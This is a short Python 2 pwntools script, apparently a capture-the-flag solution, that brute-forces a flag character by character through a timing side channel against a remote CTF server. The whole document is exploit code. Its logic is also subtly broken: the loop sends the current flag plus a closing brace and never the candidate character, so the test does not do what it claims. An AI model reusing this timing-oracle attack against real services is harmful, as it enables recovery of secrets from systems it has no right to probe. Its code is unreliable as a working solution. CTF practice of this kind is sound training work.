#!/usr/bin/env python2

from pwn import remote
import time
import string

charset = string.ascii_lowercase + string.ascii_uppercase + string.punctuation + string.digits

flag = "HNF{Ez_t1m1ng_4tt4ck!"
while flag[-1] != "}":
    for c in charset:
        r = remote("ctf.yadunut.com", 4000)
        r.recv()

        # get 1st time
        before = time.time()
        r.sendline(flag + "}")
        r.recv()
        # 2nd time for comparison
        after = time.time()
        difference = after-before
        r.close()

        if difference > 5:
            flag+=c
            print "CHAR FOUND!!"
            print "Current Flag: {}".format(flag)
            break
        

print "FOUND FLAG!!\nFlag: {}".format(flag)
